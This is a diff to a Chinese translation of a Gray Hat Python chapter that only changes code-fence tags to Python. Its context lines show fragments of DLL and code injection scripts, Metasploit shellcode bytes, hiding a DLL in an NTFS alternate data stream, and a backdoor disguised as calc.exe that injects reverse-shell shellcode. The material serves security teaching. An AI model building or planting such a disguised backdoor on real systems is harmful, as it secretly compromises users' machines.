@@ -10,7 +10,7 @@
 
 两种注入虽然在基础原理上不同，但是实现的方法差不多：创建远线程。这由 CreateRemoteThread()完成，同样由由 kernel32.dll 导出。原型如下:
 
-```
+```py
 HANDLE WINAPI CreateRemoteThread( 
     HANDLE hProcess,
     LPSECURITY_ATTRIBUTES lpThreadAttributes, 
@@ -32,7 +32,7 @@ DLL 注入是亦正亦邪的技术。从 Windows 的 shell 扩展到病毒的偷
 
 在一个进程里载入 DLL 需要使用 LoadLibrary()函数（由 kernel32.dll 导出）。函数原型 如下：
 
-```
+```py
 HMODULE LoadLibrary( 
     LPCTSTR lpFileName
 ); 
@@ -42,7 +42,7 @@ lpFileName 参数为 DLL 的路径。我们需要让目标调用 LoadLibraryA �
 
 DLL 注入测试的源码，可从 [`www.nostarch.com/ghpython.htm`](http://www.nostarch.com/ghpython.htm) 下载。
 
-```
+```py
 #dll_injector.py
 import sys
 from ctypes import * 
@@ -89,7 +89,7 @@ print "[*] Remote thread with ID 0x%08x created." % thread_id.value
 
 可以通过 Metasploit 的主页获得终止进程的 shellcode，它们的 shellcode 生成器非常好 用。如果之前没用过的，直接访问 [`metasploit.com/shellcode/`](http://metasploit.com/shellcode/)。这次我们使用 Windows Execute Command shellcode 生成器。创建的 shellcdoe 如表 7-1。
 
-```
+```py
 /* win32_exec - EXITFUNC=thread CMD=taskkill /PID AAAAAAAA Size=152 Encoder=None http://metasploit.com*/
 unsigned char scode[] = 
     "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b" 
@@ -110,7 +110,7 @@ Listing 7-1:由 Metasploit 产生的 Process-killing shellcode
 
 现在我们有了自己的 shellcode，是时候回来进行实际的 code injection 工作了。
 
-```
+```py
 #code_injector.py
 import sys
 from ctypes import *
@@ -148,7 +148,7 @@ if not h_process:
     print "[*] Couldn't acquire a handle to PID: %s" % pid 
 ```
 
-```
+```py
 # code_injector.py 
 import sys
 from ctypes import *
@@ -205,7 +205,7 @@ print "[*] Process %s should not be running anymore!" % pid_to_kill
 
 脚本调用参数如下：
 
-```
+```py
 ./code_injector.py <PID to inject> <PID to kill> 
 ```
 
@@ -237,13 +237,13 @@ OS 就是我们最好的老师，NTFS 同样提供了很多强大而隐秘的技
 
 在一个文件上使用 ADS，很简单，只要在文件名后附加双引号，接着跟上我们想隐藏 的文件。
 
-```
+```py
 reverser.exe:vncdll.dll 
 ```
 
 在 这 个 例 子 中 我 们 将 vncdll. dll 附 加 到 reverser.exe 中 。 下 面 写 个 简 单 的 脚 本 file_hider.py，就当的读取文件然后写入指定文件的 ADS。
 
-```
+```py
 #file_hider.py import sys
 # Read in the DLL
 fd = open( sys.argv[1], "rb" ) 
@@ -262,7 +262,7 @@ fd.close()
 
 让我们构建我们的重定向代码，只要简单的启动指定名字的程序就行了。之所以叫执行 重定向，是因为我们将后门的名字命名为 calc.exe 了还将原来的 calc.exe 移动到了别的地方。 当用户测试执行计算器的时候，就会不经意的执行了我们的后门，后门程序通过重定向代码， 启动真正的计算器。用户会看不到任何邪恶的东西，依旧正常的使用计算器。下面的脚本引 用了第三章的 my_debugger_defines.py，其中包含了创建进程所需要的结构和常量。
 
-```
+```py
 #backdoor.py
 # This library is from Chapter 3 and contains all
 # the necessary defines for process creation 
@@ -293,7 +293,7 @@ pid = process_information.dwProcessId
 
 一样很简单，没有新代码。接下来让我们把注入的代码加到后门中。我们的注入函数能 够处理代码注入和 DLL 注入两种情况；parameter 标志设置为 1，data 变量包含 DLL 路径， 就能进行 DLL 注入，默认情况下 parameter 设置成 0，就是代码注入。跟黑的在后面。
 
-```
+```py
 #backdoor.py
 ...
 def inject( pid, data, parameter = 0 ):
@@ -320,7 +320,7 @@ def inject( pid, data, parameter = 0 ):
 
 现在我们有了能够支持两种注入的代码。是时候将两段不同的 shellcode 注入真正的 cacl.exe 进程了，一个 shellcode 反弹 shell 给我们，另一个杀死后门进程。
 
-```
+```py
 #backdoor.py
 ...
 # Now we have to climb out of the process we are in
@@ -375,7 +375,7 @@ All right!后门程序通计算器(系统的 cacl.exe 有按钮和数字在上�
 
 py2exe 是一个非常方便的 Python 库，能够将 Python 脚本编译成完全独立的 Windows 执行程序。记得在下面的操作都是基于 Windows 平台，Linux 平台内置 Python。py2exe 安 装完成后，你就能够在脚本中使用他们了。在这之前先看看调用它们。
 
-```
+```py
 #setup.py
 # Backdoor builder
 from distutils.core import setup 
@@ -389,13 +389,13 @@ setup(
 
 很好很简单。仔细看看我们传入 setup 的函数。第一个，console 是我们要编译的 Python 脚本。 options 和 zipfile 参数设置为需要打包的 Python DLL 和所有别的依赖的库。这样我 们的后门就能在任何没有安装 python 的 windlws 系统上使用了。确保 my_debugger_defines.py, backdoor.py, 和 setup.py 文件在相同的目录下。在命令行下输入以下命令，编译脚本。
 
-```
+```py
 python setup.py py2exe 
 ```
 
 在编译完成后，在目录下会看到多出两个目录，dist 和 build。在 dist 文件夹下可以找到 backdoor.exe。重命名为 calc.exe 拷贝到目标系统，并将目标系统的 calc.exe 从 C:\WINDOWS\system32\ 拷贝到别的 目录(比如 C:\ folder)。将我们的 calc.exe 复制到 C:\WINDOWS\system32\ 目录下。现在我们 还需要一个简单的 shell 接口，用来和反弹回来的 shell 交互，发送命令，接收结果。
 
-```
+```py
 #backdoor_shell.py
 import socket 
 import sys
